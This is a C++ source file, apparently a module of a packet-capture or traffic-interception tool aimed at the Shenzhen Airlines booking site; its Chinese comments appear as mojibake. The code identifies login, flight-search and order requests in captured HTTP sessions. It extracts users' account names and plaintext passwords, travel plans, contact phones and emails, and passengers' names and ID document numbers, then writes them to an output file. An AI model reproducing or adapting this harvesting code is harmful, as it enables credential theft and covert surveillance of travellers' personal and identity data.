
#include "StdAfx.h"

#include "PlaneShenZhenAirlines.h"

plane::ShenZhenAirlines::ShenZhenAirlines(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::ShenZhenAirlines::~ShenZhenAirlines()
{
	
}

// 0 ���֤��1 ���գ�9 ����֤��
string plane::ShenZhenAirlines::GetIdType(string idType)
{
	string idTypeTrue;
	if (idType == "0"){idTypeTrue = "���֤";}
	if (idType == "1"){idTypeTrue = "����";}
	if (idType == "9"){idTypeTrue = "����֤��";}
	return idTypeTrue;
}

int plane::ShenZhenAirlines::IsShenZhenAirlines(HttpSession *http_session)
{
	//��¼
	if((http_session->m_Requestline.m_Host.Find("www.shenzhenair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/szair_B2C/login/login.action")!=-1) )
	{
		return kpclogin;
	}
	//�г�Ԥ��
	if((http_session->m_Requestline.m_Host.Find("www.shenzhenair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/szair_B2C/flightSearch.action")!=-1))
	{
		return kpcticket;
	}
	//�ύ����
	if((http_session->m_Requestline.m_Host.Find("www.shenzhenair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/szair_B2C/saveOrder.action")!=-1))
	{
		return kpcorder;
	}
	return 0;
}

int plane::ShenZhenAirlines::Process(const char *packet,int action)
{
	//��¼
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//�г�Ԥ��
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	//��¼
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	return 1;
}

//��¼
int plane::ShenZhenAirlines::pclogin(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	ms_->SplitStringToMap(src_data,'&','=');
	username = ms_->GetValueFromMapByKey("condition.user_id",true);
	password = ms_->GetValueFromMapByKey("condition.password",true);
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ = 
		"user=" + username +"\r\n" + //�˺�
		"pass=" + password + "\r\n" + //����
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}

// �г�Ԥ��
int plane::ShenZhenAirlines::pcticket(const char *packet)
{
	string referer = http_session_->m_Requestline.m_Referer.GetBuffer(0);
	referer = ms_->UrlDecode(referer);
	ms_->Replace(referer,"?","&");
	ms_->SplitStringToMap(referer,"&","=");

	deptCdTxt = ms_->GetValueFromMapByKey("orgCity",true);
	arrCdTxt = ms_->GetValueFromMapByKey("dstCity",true);
	deptDt = ms_->GetValueFromMapByKey("orgDate",true);
	deptDtRe = ms_->GetValueFromMapByKey("dstDate",true);
	//�жϵ��� ������
	string hcType = ms_->GetValueFromMapByKey("hcType",true);

	if (deptCdTxt.empty() || arrCdTxt.empty() || deptDt.empty())
	{
		return 0;
	}
	if (hcType == "DC")
	{
		//����
		output_text_ =
			"nick=" +	deptCdTxt + "\r\n" +  //������
			"msg=" + 	arrCdTxt + "\r\n" +   //Ŀ�ĵ� 
			"servername=" + deptDt + "\r\n" + //��������
			"state=���ڵ��̲�ѯ\r\n";
		WriteIndexFile();
	}
	if (hcType == "WF")
	{
		//����
		string desdata = ms_->GetValueFromMapByKey("condition.dstDate",true);
		//����
		output_text_ =
			"nick=" +	deptCdTxt + "\r\n" +   //������
			"msg=" + 	arrCdTxt + "\r\n" +    //Ŀ�ĵ� 
			"servername=" + deptDt + "\r\n" +  //��������
			"appname=" +  desdata + "\r\n" +   //��������
			"state=����������ѯ\r\n";
		WriteIndexFile();
	}
	return 1;
}
//�ύ����
int plane::ShenZhenAirlines::pcorder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	src_data = src_data.substr(src_data.find("passengerJson=")+strlen("passengerJson="));
	//����json
	Json::Value value;
	Json::Reader reader;
	Json::Value passengerList;
	if (reader.parse(src_data,value))
	{
		passengerList = value["passengerList"];
		username = value["contactName"].asString();
		mobile = value["contactMobile"].asString();
		email = value["contactEmail"].asString();
	}
	if (username .empty() || mobile.empty())
	{
		return 0;
	}
	//�˿���Ϣ
	string psgrName,certNo,certType;
	for (int i = 0; i<passengerList.size();i++)
	{
		psgrName = passengerList[i]["psgrName"].asString();
		certNo = passengerList[i]["certNo"].asString();
		certType = passengerList[i]["certType"].asString();
		if (psgrName .empty() || certNo.empty())
		{
			return 0;
		}
		certType = this->GetIdType(certType);
		output_text_ =
			"mid=" + 	username + "\r\n" +		//��ϵ������
			"oid=" + 	mobile + "\r\n" +		//��ϵ�˵绰
			"imsi=" + 	email + "\r\n" +		//��ϵ������
			"msgtype=" + psgrName + "\r\n" +	//�˿�����
			"webname=" + certType + "\r\n" +	//�˿�֤������
			"subject=" + certNo + "\r\n" +		//�˿�֤����
			"state=�ύ����\r\n";
			WriteIndexFile();
	}
	return 1;
}
